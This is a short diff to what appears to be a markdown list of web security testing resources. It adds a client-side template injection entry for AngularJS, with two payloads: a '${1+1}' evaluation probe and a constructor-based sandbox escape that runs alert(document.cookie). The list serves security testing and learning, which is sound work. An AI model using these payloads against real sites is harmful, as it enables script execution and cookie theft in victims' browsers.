@@ -104,6 +104,14 @@
     - [swagger-ui-xss](https://github.com/VictorNS69/swagger-ui-xss): Outdated Swagger version
     - [dalfox](https://github.com/hahwul/dalfox): open-source XSS scanner
 
+  - CSTI
+    - AngularJS
+  
+   ```js
+   ${1+1}
+   {{constructor.constructor('alert(document.cookie)')()}}
+   ```
+
 - Business logic error
 
 #### Learning resources 
